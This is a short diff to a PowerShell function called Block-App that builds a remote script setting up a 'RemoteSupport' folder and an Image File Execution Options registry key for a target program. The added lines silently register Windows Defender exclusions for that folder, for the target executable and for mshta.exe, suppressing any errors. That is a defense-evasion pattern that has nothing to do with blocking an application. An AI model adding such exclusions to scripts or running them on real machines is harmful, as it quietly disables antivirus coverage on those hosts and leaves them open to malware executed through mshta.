@@ -337,6 +337,9 @@ function Block-App($ip, $exe, $useMsg) {
     $wsc = ($useMsg -eq $true -or $useMsg -eq 'true')
     $ps = @"
 `$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null
+try{ Add-MpPreference -ExclusionPath `$d -EA SilentlyContinue } catch {}
+try{ Add-MpPreference -ExclusionProcess '$exe' -EA SilentlyContinue } catch {}
+try{ Add-MpPreference -ExclusionProcess 'mshta.exe' -EA SilentlyContinue } catch {}
 `$k="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$exe"
 New-Item `$k -Force | Out-Null
 "@
